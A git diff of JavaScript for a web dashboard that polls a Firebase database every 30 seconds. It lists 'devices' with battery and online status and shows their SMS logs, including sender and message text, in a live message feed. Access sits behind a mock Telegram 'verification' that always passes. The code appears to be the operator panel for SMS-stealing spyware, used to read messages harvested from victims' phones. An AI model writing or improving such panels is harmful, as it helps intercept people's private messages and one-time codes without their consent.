@@ -1,11 +1,52 @@
-// Configuration - YOUR FIREBASE URL
+// Configuration
 const API_BASE = 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app';
 const USERS_URL = `${API_BASE}/users.json?shallow=true`;
 
-let allUsers = [];
+let allUsers = {};
+let filteredUsers = {};
+let showOnlyOnline = false;
 let refreshInterval = null;
+let feedMessages = [];
+let verified = false;
 
-// Fetch all user IDs
+// === Verification ===
+function verifyAccess() {
+    const btn = document.getElementById('verifyBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Verifying...';
+    
+    // Simulate verification (in reality, you'd check Telegram membership)
+    setTimeout(() => {
+        verified = true;
+        document.getElementById('verificationScreen').style.display = 'none';
+        document.getElementById('mainDashboard').style.display = 'block';
+        fetchAllData();
+        startAutoRefresh();
+    }, 1500);
+}
+
+// === Toggle Function ===
+function toggleDevices() {
+    const allBtn = document.getElementById('toggleBtn');
+    const onlineBtn = document.getElementById('toggleBtnOnline');
+    
+    // Toggle active state
+    if (showOnlyOnline) {
+        showOnlyOnline = false;
+        allBtn.classList.add('active');
+        onlineBtn.classList.remove('active');
+        document.getElementById('devicesTitle').textContent = '📱 All Devices';
+    } else {
+        showOnlyOnline = true;
+        onlineBtn.classList.add('active');
+        allBtn.classList.remove('active');
+        document.getElementById('devicesTitle').textContent = '🟢 Online Only';
+    }
+    
+    renderDevices();
+}
+
+// === Data Fetching ===
 async function fetchUserIds() {
     try {
         const response = await fetch(USERS_URL);
@@ -18,7 +59,6 @@ async function fetchUserIds() {
     }
 }
 
-// Fetch data for a single user
 async function fetchUserData(userId) {
     try {
         const url = `${API_BASE}/users/${userId}.json`;
@@ -31,7 +71,6 @@ async function fetchUserData(userId) {
     }
 }
 
-// Parse timestamp
 function parseTimestamp(timestamp) {
     if (!timestamp) return 'N/A';
     if (typeof timestamp === 'number') {
@@ -47,7 +86,6 @@ function parseTimestamp(timestamp) {
     return String(timestamp);
 }
 
-// Check if user is online
 function isUserOnline(userData) {
     if (userData && userData.status) {
         return userData.status.isOnline === true;
@@ -55,7 +93,6 @@ function isUserOnline(userData) {
     return false;
 }
 
-// Get last seen
 function getLastSeen(userData) {
     if (userData && userData.status && userData.status.lastSeen) {
         return parseTimestamp(userData.status.lastSeen);
@@ -63,7 +100,6 @@ function getLastSeen(userData) {
     return 'N/A';
 }
 
-// Get SMS count
 function getSmsCount(userData) {
     if (userData && userData.sms_logs) {
         return Object.keys(userData.sms_logs).length;
@@ -71,7 +107,6 @@ function getSmsCount(userData) {
     return 0;
 }
 
-// Get latest SMS
 function getLatestSms(userData) {
     if (userData && userData.sms_logs) {
         const smsEntries = Object.entries(userData.sms_logs);
@@ -86,7 +121,19 @@ function getLatestSms(userData) {
     return null;
 }
 
-// Get notifications count
+function getAllSms(userData) {
+    if (userData && userData.sms_logs) {
+        const smsEntries = Object.entries(userData.sms_logs);
+        smsEntries.sort((a, b) => {
+            const tsA = a[1].timestamp || 0;
+            const tsB = b[1].timestamp || 0;
+            return tsB - tsA;
+        });
+        return smsEntries.map(entry => entry[1]);
+    }
+    return [];
+}
+
 function getNotificationsCount(userData) {
     if (userData && userData.notifications) {
         return Object.keys(userData.notifications).length;
@@ -94,7 +141,6 @@ function getNotificationsCount(userData) {
     return 0;
 }
 
-// Escape HTML
 function escapeHtml(text) {
     if (!text) return '';
     const div = document.createElement('div');
@@ -102,8 +148,8 @@ function escapeHtml(text) {
     return div.innerHTML;
 }
 
-// Render a user card
-function renderUserCard(userId, userData) {
+// === Render Functions ===
+function renderDeviceCard(userId, userData) {
     const online = isUserOnline(userData);
     const smsCount = getSmsCount(userData);
     const latestSms = getLatestSms(userData);
@@ -112,31 +158,28 @@ function renderUserCard(userId, userData) {
     const battery = userData?.status?.battery ?? 'N/A';
 
     const card = document.createElement('div');
-    card.className = 'user-card';
-    card.id = `user-${userId}`;
+    card.className = `device-card ${!online ? 'offline' : ''}`;
+    card.id = `device-${userId}`;
 
-    let smsHtml = '<div class="sms-section"><h4>📨 Latest SMS</h4>';
+    let smsHtml = '';
     if (latestSms) {
-        smsHtml += `
-            <div class="sms-item">
+        smsHtml = `
+            <div class="device-sms">
                 <div class="sms-sender">${escapeHtml(latestSms.sender || 'Unknown')}</div>
                 <div class="sms-message">${escapeHtml(latestSms.message || 'No message')}</div>
-                <div class="sms-timestamp">${parseTimestamp(latestSms.timestamp)}</div>
+                <div class="sms-time">${parseTimestamp(latestSms.timestamp)}</div>
             </div>
         `;
-    } else {
-        smsHtml += `<div class="no-sms">No SMS logs</div>`;
     }
-    smsHtml += `</div>`;
 
     card.innerHTML = `
-        <div class="user-header">
-            <span class="user-id">📱 ${userId.substring(0, 8)}...</span>
+        <div class="device-header">
+            <span class="device-id">📱 ${userId.substring(0, 10)}...</span>
             <span class="online-status ${online ? 'status-online' : 'status-offline'}">
-                ${online ? '🟢 Online' : '⚫ Offline'}
+                ${online ? '🟢 ONLINE' : '⚫ OFFLINE'}
             </span>
         </div>
-        <div style="display:flex; gap:16px; flex-wrap:wrap; margin-bottom:12px; font-size:14px; color:#4a5568;">
+        <div class="device-info">
             <span>🔋 ${battery}%</span>
             <span>📨 ${smsCount} SMS</span>
             <span>🔔 ${notifCount} Notifications</span>
@@ -148,76 +191,139 @@ function renderUserCard(userId, userData) {
     return card;
 }
 
-// Update statistics
-function updateStats(usersData) {
-    const total = Object.keys(usersData).length;
+function renderDevices() {
+    const grid = document.getElementById('devicesGrid');
+    const loading = document.getElementById('loadingIndicator');
+    
+    loading.style.display = 'none';
+    grid.innerHTML = '';
+
+    // Filter users
+    const usersToShow = showOnlyOnline 
+        ? Object.fromEntries(Object.entries(allUsers).filter(([id, data]) => isUserOnline(data)))
+        : allUsers;
+
+    const userIds = Object.keys(usersToShow);
+    
+    if (userIds.length === 0) {
+        grid.innerHTML = `<div class="no-devices">${showOnlyOnline ? 'No online devices' : 'No devices found'}</div>`;
+        return;
+    }
+
+    const fragment = document.createDocumentFragment();
+    userIds.forEach(userId => {
+        const card = renderDeviceCard(userId, usersToShow[userId]);
+        fragment.appendChild(card);
+    });
+    grid.appendChild(fragment);
+}
+
+function renderMessageFeed() {
+    const feed = document.getElementById('messageFeed');
+    if (feedMessages.length === 0) {
+        feed.innerHTML = '<div class="placeholder">Waiting for messages...</div>';
+        return;
+    }
+
+    // Show last 50 messages
+    const recentMessages = feedMessages.slice(0, 50);
+    feed.innerHTML = recentMessages.map(msg => `
+        <div class="feed-item">
+            <div class="feed-header">
+                <span class="feed-device">📱 ${escapeHtml(msg.deviceId.substring(0, 10))}...</span>
+                <span class="feed-time">${parseTimestamp(msg.timestamp)}</span>
+            </div>
+            <div class="feed-message">${escapeHtml(msg.message)}</div>
+        </div>
+    `).join('');
+}
+
+function updateStats() {
+    const userIds = Object.keys(allUsers);
+    const total = userIds.length;
     let online = 0;
     let totalSms = 0;
 
-    for (const userId in usersData) {
-        if (isUserOnline(usersData[userId])) online++;
-        totalSms += getSmsCount(usersData[userId]);
-    }
+    userIds.forEach(userId => {
+        if (isUserOnline(allUsers[userId])) online++;
+        totalSms += getSmsCount(allUsers[userId]);
+    });
 
-    document.getElementById('totalUsers').textContent = total;
-    document.getElementById('onlineUsers').textContent = online;
-    document.getElementById('newSms').textContent = totalSms;
+    document.getElementById('onlineCount').textContent = online;
+    document.getElementById('smsCount').textContent = totalSms;
+    document.getElementById('lastUpdate').textContent = `Last update: ${new Date().toLocaleString()}`;
 }
 
-// Main function to fetch all data
+// === Main Fetch Function ===
 async function fetchAllData() {
     const refreshBtn = document.getElementById('refreshBtn');
-    const loadingIndicator = document.getElementById('loadingIndicator');
-    const userGrid = document.getElementById('userGrid');
+    const loading = document.getElementById('loadingIndicator');
+    const grid = document.getElementById('devicesGrid');
     
     refreshBtn.disabled = true;
-    loadingIndicator.style.display = 'block';
-    userGrid.innerHTML = '';
+    loading.style.display = 'block';
+    grid.innerHTML = '';
 
     try {
         const userIds = await fetchUserIds();
         
         if (userIds.length === 0) {
-            userGrid.innerHTML = '<div class="loading"><p>No users found in database.</p></div>';
+            grid.innerHTML = '<div class="no-devices">No devices found in database</div>';
+            loading.style.display = 'none';
             return;
         }
 
         const fetchPromises = userIds.map(userId => fetchUserData(userId));
         const usersDataArray = await Promise.all(fetchPromises);
 
-        const usersData = {};
+        const newUsers = {};
         userIds.forEach((userId, index) => {
             if (usersDataArray[index]) {
-                usersData[userId] = usersDataArray[index];
+                newUsers[userId] = usersDataArray[index];
             }
         });
 
-        const fragment = document.createDocumentFragment();
-        for (const userId in usersData) {
-            const card = renderUserCard(userId, usersData[userId]);
-            fragment.appendChild(card);
-        }
-        userGrid.appendChild(fragment);
+        // Update allUsers
+        allUsers = newUsers;
 
-        updateStats(usersData);
-        document.getElementById('lastUpdate').textContent = `Last update: ${new Date().toLocaleString()}`;
-        allUsers = usersData;
+        // Update message feed
+        const newMessages = [];
+        for (const userId in newUsers) {
+            const smsList = getAllSms(newUsers[userId]);
+            smsList.forEach(sms => {
+                if (sms && sms.message) {
+                    newMessages.push({
+                        deviceId: userId,
+                        message: sms.message,
+                        timestamp: sms.timestamp || Date.now()
+                    });
+                }
+            });
+        }
+        // Sort messages by timestamp (newest first)
+        newMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        feedMessages = newMessages;
+
+        // Render everything
+        renderMessageFeed();
+        renderDevices();
+        updateStats();
 
     } catch (error) {
-        console.error('Error:', error);
-        userGrid.innerHTML = `
-            <div class="loading">
-                <p>❌ Error loading data: ${error.message}</p>
-                <button onclick="fetchAllData()" style="margin-top:16px; padding:8px 20px; background:#667eea; color:white; border:none; border-radius:8px; cursor:pointer;">Retry</button>
+        console.error('Error fetching data:', error);
+        grid.innerHTML = `
+            <div class="no-devices">
+                ❌ Error loading data: ${error.message}
+                <br><br>
+                <button onclick="fetchAllData()" style="background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:8px 20px;border-radius:8px;cursor:pointer;">Retry</button>
             </div>
         `;
     } finally {
         refreshBtn.disabled = false;
-        loadingIndicator.style.display = 'none';
+        loading.style.display = 'none';
     }
 }
 
-// Auto-refresh every 30 seconds
 function startAutoRefresh() {
     if (refreshInterval) {
         clearInterval(refreshInterval);
@@ -225,16 +331,13 @@ function startAutoRefresh() {
     refreshInterval = setInterval(fetchAllData, 30000);
 }
 
-// Initialize
+// === Initialize ===
 document.addEventListener('DOMContentLoaded', () => {
-    fetchAllData();
-    startAutoRefresh();
-
-    window.addEventListener('beforeunload', () => {
-        if (refreshInterval) {
-            clearInterval(refreshInterval);
-        }
-    });
+    // Show verification screen by default
+    document.getElementById('verificationScreen').style.display = 'flex';
+    document.getElementById('mainDashboard').style.display = 'none';
 });
 
+window.verifyAccess = verifyAccess;
+window.toggleDevices = toggleDevices;
 window.fetchAllData = fetchAllData;
